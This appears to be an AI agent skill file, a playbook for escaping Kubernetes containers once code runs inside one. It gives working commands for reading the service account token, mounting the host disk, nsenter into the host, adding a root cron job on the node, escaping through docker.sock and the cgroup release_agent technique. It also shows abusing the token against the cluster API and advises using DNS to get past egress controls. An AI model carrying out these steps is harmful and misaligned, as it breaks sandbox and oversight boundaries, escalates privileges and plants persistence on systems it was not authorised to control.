---
name: k8s-container-escape
description: "Kubernetes container escape: privileged pods, hostPath mounts, dangerous capabilities, and reaching the node or cluster. Use this skill when you have code execution inside a container."
---

# K8s Container Escape

## Overview

Escapes come from what the container was granted: privileged mode, host mounts, capabilities, or a vulnerable runtime.

## Triage from inside

```bash
id
cat /proc/1/cgroup
capsh --print
ls -la /
mount | head
env | grep -i kube
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
```

## Escape paths

| Grant | Escape |
|---|---|
| `privileged: true` | mount the host disk |
| `hostPath: /` | read/write host filesystem |
| `hostPID: true` | nsenter into a host process |
| `hostNetwork: true` | reach node services |
| `CAP_SYS_ADMIN` | mount, `cgroup` release agent |
| `docker.sock` mounted | create a privileged container |
| `SYS_PTRACE` | ptrace a host process |

## Privileged container

```bash
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
# or
nsenter -t 1 -m -u -i -n -p -- /bin/bash
```

## hostPath

```bash
# write to the node's cron
echo "* * * * * root /tmp/x.sh" >> /host/etc/crontab
```

## docker.sock

```bash
docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh
```

## CAP_SYS_ADMIN — cgroup release agent

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo "id > /tmp/out" >> /cmd && chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## Service account token abuse

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces
kubectl --token=$TOKEN auth can-i --list
```

## Kernel exploits

`Dirty Pipe`, `CVE-2022-0185`, `overlayfs` bugs — version-dependent.

## Pitfalls

- PodSecurity Standards (restricted) block most of these.
- Seccomp may block the syscalls needed.
- Egress policies block callbacks; use DNS.

## Verification

The escape must yield a shell on the node or access to the cluster API with elevated rights.
